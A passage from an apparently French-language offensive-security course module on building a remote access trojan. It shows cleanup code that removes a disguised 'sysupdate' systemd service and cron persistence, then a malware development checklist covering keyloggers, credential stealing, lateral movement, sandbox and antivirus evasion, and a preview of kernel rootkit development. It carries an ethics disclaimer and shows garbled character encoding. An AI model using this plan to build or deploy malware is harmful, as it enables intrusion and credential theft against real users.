    system("sudo systemctl disable sysupdate.service 2>/dev/null");
    system("sudo rm /etc/systemd/system/sysupdate.service 2>/dev/null");

    // Nettoyer crontab
    system("crontab -l | grep -v '.sysupdate' | crontab -");

    printf("[+] Persistence mechanisms removed\n");
}
```

## ğŸ“ Points clÃ©s Ã  retenir

1. **Architecture modulaire** : Core + Modules sÃ©parÃ©s
2. **C2 chiffrÃ©** : AES + RSA pour sÃ©curitÃ©
3. **Persistence multi-couches** : Redondance
4. **Ã‰vasion** : Anti-debug, anti-sandbox
5. **Modules** : Keylogger, creds, lateral movement

### Checklist de dÃ©veloppement de malware

```
Phase              TÃ¢ches                              Statut
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. Core           - Module loader                     â–¡
                  - C2 communication                   â–¡
                  - Config management                  â–¡

2. Modules        - Keylogger                          â–¡
                  - Credential stealer                 â–¡
                  - File manager                       â–¡
                  - Shell                              â–¡
                  - Lateral movement                   â–¡

3. Persistence    - Systemd service                    â–¡
                  - Cron jobs                          â–¡
                  - .bashrc injection                  â–¡

4. Ã‰vasion        - Anti-sandbox                       â–¡
                  - Anti-debug                         â–¡
                  - String encryption                  â–¡
                  - Code obfuscation                   â–¡

5. C2             - Encryption (AES/RSA)               â–¡
                  - Heartbeat mechanism                â–¡
                  - Command queue                      â–¡
                  - Fallback domains                   â–¡

6. Testing        - Sandbox testing                    â–¡
                  - AV testing (VirusTotal)            â–¡
                  - Functionality testing              â–¡
```

### ConsidÃ©rations Ã©thiques

**IMPORTANT** : Ce module est Ã  des fins Ã©ducatives uniquement. Le dÃ©veloppement et l'utilisation de malware sans autorisation explicite est **ILLÃ‰GAL** et **NON Ã‰THIQUE**.

Usage lÃ©gitime uniquement dans :
- Environnements Red Team autorisÃ©s
- Labs personnels isolÃ©s
- Recherche en sÃ©curitÃ©
- Programmes de bug bounty

## â¡ï¸ Prochaine Ã©tape

Maintenant que tu comprends l'architecture d'un malware complet, tu es prÃªt pour le **Module 56 : DÃ©veloppement de Rootkit**, oÃ¹ tu apprendras Ã  crÃ©er des rootkits kernel-mode pour une persistance et une furtivitÃ© maximales.

### Ce que tu as appris
- Architecture complÃ¨te d'un RAT
- DÃ©veloppement de modules
- Communication C2 chiffrÃ©e
- Persistence multi-couches
- Lateral movement
- Credential stealing

### Ce qui t'attend
- Rootkits kernel-mode
- Hooking systÃ¨me
- Masquage de processus/fichiers
- Kernel module programming
- Intercepter syscalls
- Techniques anti-forensics avancÃ©es
